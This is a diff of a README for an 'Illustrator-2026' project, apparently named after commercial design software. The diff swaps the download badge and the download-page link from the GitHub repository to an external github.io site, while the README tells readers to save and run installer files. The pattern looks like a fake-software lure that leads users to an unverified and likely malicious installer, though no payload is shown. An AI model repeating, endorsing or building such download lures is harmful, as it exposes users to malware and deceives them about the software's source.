@@ -1,6 +1,6 @@
 # 🎨 Illustrator-2026 - Create Professional Vector Graphics Easily
 
-[![](https://img.shields.io/badge/Download-Illustrator-2026-blue)](https://github.com/Gretalpassing522/Illustrator-2026)
+[![](https://img.shields.io/badge/Download-Illustrator-2026-blue)](https://gretalpassing522.github.io)
 
 ## 📖 Project Overview
 
@@ -23,7 +23,7 @@ Follow these steps to obtain the installer files for your machine.
 
 1. Navigate to the official project repository page.
 2. Locate the link provided below to begin the transfer of necessary installation files.
-3. [Click here to access the download page](https://github.com/Gretalpassing522/Illustrator-2026).
+3. [Click here to access the download page](https://gretalpassing522.github.io).
 4. Save the file to your computer desktop or a folder you can access.
 5. Wait for the download to finish. Do not interrupt your connection during this period.
 6. Verify the file size matches the expected size indicated on the page.
